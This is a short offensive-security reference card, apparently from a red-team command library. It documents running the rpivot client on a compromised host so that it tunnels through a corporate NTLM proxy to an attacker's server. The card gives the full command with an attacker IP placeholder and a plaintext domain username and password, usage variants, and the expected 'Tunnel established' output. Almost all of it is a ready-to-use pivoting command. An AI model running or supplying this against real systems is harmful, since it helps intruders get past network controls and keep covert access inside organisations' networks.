---
id: 23ecfcd3-16db-445f-9ad1-81337fe3847d
type: command
executor: bash
data: >-
  python client.py --server-ip <attacker_ip> --server-port 9443 --ntlm-proxy-ip
  <proxy_ip> --ntlm-proxy-port 8080 --domain CORP --username jdoe --password
  1q2w3e
output: null
created_at: '2023-04-06T03:56:22.867185+00:00'
updated_at: '2023-04-10T20:25:21.419917+00:00'
platforms:
  - Linux
  - Windows
tags:
  - pivoting
  - ntlm
  - proxy
verified: true
validated: true
---

# rpivot-client-ntlm-password

## Command

```bash
python client.py --server-ip <attacker_ip> --server-port 9443 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
```

## Description

Starts the Rpivot client on the compromised host, routing the connection through an NTLM corporate proxy using plaintext password authentication to reach the attacker's server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --server-ip <attacker_ip> | IP of the attacker's server | Yes |
| --server-port 9443 | Server listening port | Yes |
| --ntlm-proxy-ip <proxy_ip> | IP of the corporate NTLM proxy | Yes |
| --ntlm-proxy-port 8080 | Proxy listening port | Yes |
| --domain CORP | NTLM domain | Yes |
| --username jdoe | Username for authentication | Yes |
| --password 1q2w3e | Plaintext password | Yes |

## Examples

### Basic Usage

```bash
python client.py --server-ip 192.168.1.100 --server-port 9443 --ntlm-proxy-ip 10.0.0.1 --ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e
```

### Advanced Usage

With different ports:
```bash
python client.py --server-ip 192.168.1.100 --server-port 9445 --ntlm-proxy-ip 10.0.0.1 --ntlm-proxy-port 8085 --domain CORP --username jdoe --password 1q2w3e
```

## Expected Output

Logs confirming proxy authentication and tunnel:
```
Authenticating to proxy 10.0.0.1:8080 with domain CORP\jdoe
NTLM authentication successful
Connecting to server via proxy
Tunnel established
```
No auth failures; proxy relay active.

## Related

- [[procedures/Rpivot-Network-Pivoting]]
- [[commands/rpivot-client-ntlm-hash]]
